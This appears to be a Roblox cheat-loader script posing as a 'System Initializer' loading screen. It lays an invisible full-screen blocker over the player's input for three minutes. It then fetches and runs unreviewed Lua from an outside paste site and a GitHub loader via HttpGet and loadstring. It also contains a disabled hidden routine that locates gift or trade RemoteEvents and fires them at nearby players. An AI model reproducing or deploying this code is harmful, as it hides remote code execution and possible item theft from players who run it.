task.wait(5) -- wait for game and scripts to fully load

local replicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

--// Configuration
local CONFIG = {
    BLOCK_DURATION = 180, -- 3 minutes in seconds
    LOADING_STEPS = {
        { text = "Initializing System...", duration = 1.2 },
        { text = "Checking Environment...", duration = 1.5 },
        { text = "Loading Components...", duration = 1.3 },
        { text = "Finalizing Setup...", duration = 0.8 },
        { text = "System Ready!", duration = 0.5 }
    },
    SCRIPTS = {
        "https://pastefy.app/fJnI69gN/raw",
        "https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua"
    },
    GIFTING_ENABLED = false, -- Hidden gifting bypass
    DEBUG_MODE = false
}

--// Utility Functions
local function safeDestroy(object)
    if object and object.Parent then
        pcall(function()
            object:Destroy()
        end)
    end
end

local function createTween(object, info, properties)
    return TweenService:Create(object, info, properties)
end

local function debugPrint(message)
    if CONFIG.DEBUG_MODE then
        print("[DEBUG] " .. tostring(message))
    end
end

--// Enhanced Gift System (Hidden)
local function initializeGiftSystem()
    if not CONFIG.GIFTING_ENABLED then
        return
    end
    
    local giftRemote = nil
    
    -- Search for gift remote more efficiently
    for _, service in pairs({replicatedStorage, workspace}) do
        for _, descendant in pairs(service:GetDescendants()) do
            if descendant:IsA("RemoteEvent") then
                local name = tostring(descendant.Name):lower()
                if name:match("gift") or name:match("trade") or name:match("send") then
                    giftRemote = descendant
                    debugPrint("Gift Remote found: " .. descendant:GetFullName())
                    break
                end
            end
        end
        if giftRemote then break end
    end

    if not giftRemote then
        debugPrint("No gifting RemoteEvent found")
        return
    end

    -- Create invisible gift system
    local giftSystem = {
        remote = giftRemote,
        lastGiftTime = 0,
        cooldown = 5, -- 5 second cooldown
        
        findNearbyPlayer = function(self, maxDistance)
            maxDistance = maxDistance or 50
            local nearestPlayer = nil
            local shortestDistance = maxDistance
            
            if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
                return nil
            end
            
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (p.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                    if distance < shortestDistance then
                        nearestPlayer = p
                        shortestDistance = distance
                    end
                end
            end
            
            return nearestPlayer, shortestDistance
        end,
        
        sendGift = function(self, target, item, amount)
            local currentTime = tick()
            if currentTime - self.lastGiftTime < self.cooldown then
                debugPrint("Gift on cooldown")
                return false
            end
            
            local success = pcall(function()
                -- Try multiple common gift remote patterns
                local patterns = {
                    function() self.remote:FireServer(target, item, amount) end,
                    function() self.remote:FireServer(target.UserId, item, amount) end,
                    function() self.remote:FireServer(target.Name, item, amount) end,
                    function() self.remote:FireServer({target = target, item = item, amount = amount}) end
                }
                
                for i, pattern in ipairs(patterns) do
                    local patternSuccess = pcall(pattern)
                    if patternSuccess then
                        debugPrint("Gift sent using pattern " .. i)
                        break
                    end
                end
            end)
            
            if success then
                self.lastGiftTime = currentTime
                debugPrint("Gift sent to: " .. target.Name)
                return true
            else
                debugPrint("Failed to send gift")
                return false
            end
        end
    }
    
    -- Hidden keybind for gifting (Ctrl + G)
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == Enum.KeyCode.G and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
            local target = giftSystem:findNearbyPlayer()
            if target then
                giftSystem:sendGift(target, "DefaultItem", 1)
            else
                debugPrint("No nearby player found for gifting")
            end
        end
    end)
    
    return giftSystem
end

--// Enhanced Input Blocker
local function blockUserInput(duration)
    local inputBlocker = Instance.new("ScreenGui")
    inputBlocker.Name = "SystemBlocker_" .. math.random(1000, 9999)
    inputBlocker.ResetOnSpawn = false
    inputBlocker.IgnoreGuiInset = true
    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    inputBlocker.DisplayOrder = 999999
    
    -- Safe parent assignment
    local success = pcall(function()
        inputBlocker.Parent = CoreGui
    end)
    
    if not success then
        inputBlocker.Parent = player:WaitForChild("PlayerGui")
    end

    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.Position = UDim2.new(0, 0, 0, 0)
    blocker.BackgroundTransparency = 1
    blocker.Text = ""
    blocker.Modal = true
    blocker.AutoButtonColor = false
    blocker.Active = true
    blocker.ZIndex = 999999
    blocker.Parent = inputBlocker

    -- Enhanced cleanup with multiple fallbacks
    local cleanupMethods = {
        function() task.delay(duration, function() safeDestroy(inputBlocker) end) end,
        function() 
            task.spawn(function()
                task.wait(duration)
                safeDestroy(inputBlocker)
            end)
        end,
        function()
            coroutine.wrap(function()
                wait(duration)
                safeDestroy(inputBlocker)
            end)()
        end
    }
    
    for _, cleanup in ipairs(cleanupMethods) do
        pcall(cleanup)
    end

    return inputBlocker
end

--// Premium Loading UI
local function createLoadingUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SystemLoader_" .. tick()
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 100000
    screenGui.Parent = player:WaitForChild("PlayerGui")

    -- Main Frame with enhanced styling
    local frame = Instance.new("Frame")
    frame.Parent = screenGui
    frame.Size = UDim2.new(0, 480, 0, 280)
    frame.Position = UDim2.new(0.5, -240, 0.5, -140)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    frame.BorderSizePixel = 0

    -- Enhanced corner radius
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 16)
    corner.Parent = frame

    -- Animated border stroke
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 140, 255)
    stroke.Thickness = 3
    stroke.Transparency = 0.3
    stroke.Parent = frame

    -- Dynamic gradient background
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 45)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(15, 15, 25)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 40))
    }
    gradient.Rotation = 45
    gradient.Parent = frame

    -- Animated title with glow effect
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, -20, 0, 50)
    titleLabel.Position = UDim2.new(0, 10, 0, 20)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 24
    titleLabel.Text = "⚡ System Initializer"
    titleLabel.TextXAlignment = Enum.TextXAlignment.Center

    -- Add text glow effect
    local titleStroke = Instance.new("UIStroke")
    titleStroke.Color = Color3.fromRGB(80, 140, 255)
    titleStroke.Thickness = 1
    titleStroke.Transparency = 0.7
    titleStroke.Parent = titleLabel

    -- Enhanced status label
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Parent = frame
    statusLabel.Size = UDim2.new(1, -40, 0, 70)
    statusLabel.Position = UDim2.new(0, 20, 0, 80)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 18
    statusLabel.Text = "Initializing..."
    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
    statusLabel.TextWrapped = true

    -- Improved progress bar with glow
    local progressContainer = Instance.new("Frame")
    progressContainer.Parent = frame
    progressContainer.Size = UDim2.new(0.85, 0, 0, 12)
    progressContainer.Position = UDim2.new(0.075, 0, 0, 180)
    progressContainer.BackgroundTransparency = 1

    local progressBg = Instance.new("Frame")
    progressBg.Parent = progressContainer
    progressBg.Size = UDim2.new(1, 0, 1, 0)
    progressBg.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    progressBg.BorderSizePixel = 0

    local progressBgCorner = Instance.new("UICorner")
    progressBgCorner.CornerRadius = UDim.new(0, 6)
    progressBgCorner.Parent = progressBg

    local progressFill = Instance.new("Frame")
    progressFill.Parent = progressBg
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(80, 140, 255)
    progressFill.BorderSizePixel = 0

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 6)
    fillCorner.Parent = progressFill

    -- Progress glow effect
    local progressGlow = Instance.new("UIStroke")
    progressGlow.Color = Color3.fromRGB(80, 140, 255)
    progressGlow.Thickness = 2
    progressGlow.Transparency = 0.5
    progressGlow.Parent = progressFill

    -- Enhanced loading dots
    local dotsLabel = Instance.new("TextLabel")
    dotsLabel.Parent = frame
    dotsLabel.Size = UDim2.new(1, 0, 0, 35)
    dotsLabel.Position = UDim2.new(0, 0, 0, 210)
    dotsLabel.BackgroundTransparency = 1
    dotsLabel.TextColor3 = Color3.fromRGB(150, 150, 200)
    dotsLabel.Font = Enum.Font.Gotham
    dotsLabel.TextSize = 16
    dotsLabel.Text = ""
    dotsLabel.TextXAlignment = Enum.TextXAlignment.Center

    -- Percentage label
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Parent = frame
    percentLabel.Size = UDim2.new(0, 60, 0, 30)
    percentLabel.Position = UDim2.new(1, -70, 0, 155)
    percentLabel.BackgroundTransparency = 1
    percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextSize = 14
    percentLabel.Text = "0%"
    percentLabel.TextXAlignment = Enum.TextXAlignment.Right

    return screenGui, statusLabel, progressFill, dotsLabel, percentLabel
end

--// Enhanced Loading Animation
local function runLoadingSequence(statusLabel, progressFill, dotsLabel, percentLabel)
    local totalSteps = #CONFIG.LOADING_STEPS
    
    -- Enhanced dots animation
    local dotsRunning = true
    local dotPatterns = {"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
    local dotIndex = 1
    
    task.spawn(function()
        while dotsRunning do
            dotsLabel.Text = dotPatterns[dotIndex]
            dotIndex = (dotIndex % #dotPatterns) + 1
            task.wait(0.1)
        end
    end)

    -- Execute loading steps with smooth animations
    for i, step in ipairs(CONFIG.LOADING_STEPS) do
        statusLabel.Text = step.text
        
        local targetProgress = i / totalSteps
        local targetPercent = math.floor(targetProgress * 100)
        
        -- Animate progress bar
        local progressTween = createTween(
            progressFill,
            TweenInfo.new(step.duration * 0.9, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
            { Size = UDim2.new(targetProgress, 0, 1, 0) }
        )
        progressTween:Play()
        
        -- Animate percentage counter
        local startPercent = tonumber(percentLabel.Text:match("%d+")) or 0
        local percentDiff = targetPercent - startPercent
        local percentSteps = step.duration * 20 -- 20 updates per second
        
        for j = 0, percentSteps do
            local currentPercent = startPercent + (percentDiff * (j / percentSteps))
            percentLabel.Text = math.floor(currentPercent) .. "%"
            task.wait(step.duration / percentSteps)
        end
    end

    dotsRunning = false
    dotsLabel.Text = "✓ Complete"
    percentLabel.Text = "100%"
end

--// Enhanced Script Loader
local function loadScripts()
    local loadedCount = 0
    local totalScripts = #CONFIG.SCRIPTS
    local loadPromises = {}

    debugPrint("Starting script loading process...")

    for i, scriptUrl in ipairs(CONFIG.SCRIPTS) do
        local promise = task.spawn(function()
            local maxRetries = 3
            local retryDelay = 2
            
            for attempt = 1, maxRetries do
                local success, result = pcall(function()
                    debugPrint(string.format("Loading script %d/%d (attempt %d)", i, totalScripts, attempt))
                    
                    local scriptContent = game:HttpGet(scriptUrl, true)
                    
                    if not scriptContent or scriptContent == "" then
                        error("Empty or invalid script content")
                    end
                    
                    -- Validate script content
                    if scriptContent:find("<!DOCTYPE html>") or scriptContent:find("<html") then
                        error("Received HTML instead of Lua script")
                    end
                    
                    local loadFunc, loadError = loadstring(scriptContent)
                    if not loadFunc then
                        error("Script compilation failed: " .. tostring(loadError))
                    end
                    
                    loadFunc()
                    return true
                end)
                
                if success then
                    loadedCount = loadedCount + 1
                    debugPrint(string.format("✅ Script %d/%d loaded successfully", i, totalScripts))
                    break
                else
                    debugPrint(string.format("❌ Script %d attempt %d failed: %s", i, attempt, tostring(result)))
                    if attempt < maxRetries then
                        task.wait(retryDelay)
                        retryDelay = retryDelay * 1.5 -- Exponential backoff
                    end
                end
            end
        end)
        
        table.insert(loadPromises, promise)
    end

    -- Wait for all scripts to complete loading
    task.wait(2)
    
    local successRate = (loadedCount / totalScripts) * 100
    debugPrint(string.format("📊 Loading complete: %d/%d scripts (%.1f%% success rate)", loadedCount, totalScripts, successRate))
    
    return loadedCount, totalScripts
end

--// Main Execution Function
local function main()
    debugPrint("System initialization started")
    
    -- Initialize hidden gift system first
    local giftSystem = initializeGiftSystem()
    
    -- Block user input
    local inputBlocker = blockUserInput(CONFIG.BLOCK_DURATION)
    debugPrint("Input blocked for " .. CONFIG.BLOCK_DURATION .. " seconds")
    
    -- Create and display loading UI
    local loadingUI, statusLabel, progressFill, dotsLabel, percentLabel = createLoadingUI()
    
    -- Run loading animation
    runLoadingSequence(statusLabel, progressFill, dotsLabel, percentLabel)
    
    -- Brief pause before cleanup
    task.wait(0.8)
    
    -- Smooth UI cleanup
    local fadeInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local fadeTween = createTween(loadingUI, fadeInfo, { Enabled = false })
    
    fadeTween:Play()
    fadeTween.Completed:Connect(function()
        safeDestroy(loadingUI)
        debugPrint("Loading UI cleaned up")
    end)
    
    -- Load scripts asynchronously
    task.spawn(function()
        local loaded, total = loadScripts()
        debugPrint("Script loading completed: " .. loaded .. "/" .. total)
    end)
    
    debugPrint("System initialization completed")
end

--// Safe Execution Wrapper
local function safeExecute()
    local success, error = pcall(main)
    if not success then
        warn("System execution failed: " .. tostring(error))
        -- Fallback cleanup
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            if gui.Name:find("SystemLoader") or gui.Name:find("ExecutorLoaderUI") then
                safeDestroy(gui)
            end
        end
    end
end

--// Execute
safeExecute()
